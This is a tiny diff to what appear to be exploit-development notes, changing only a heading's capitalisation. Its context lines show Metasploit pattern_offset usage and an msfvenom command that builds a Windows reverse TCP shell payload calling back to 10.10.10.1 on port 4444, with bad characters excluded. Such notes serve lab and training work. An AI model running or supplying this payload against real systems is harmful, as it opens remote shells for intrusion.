@@ -17,7 +17,7 @@ Pattern Create
 Pattern Offset
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 70423670
 
-msfvenom payload
+Msfvenom payload
 msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.1 lport=4444 -b "\x00\x04\x05\x35" -f c
 
 Finding bad characters
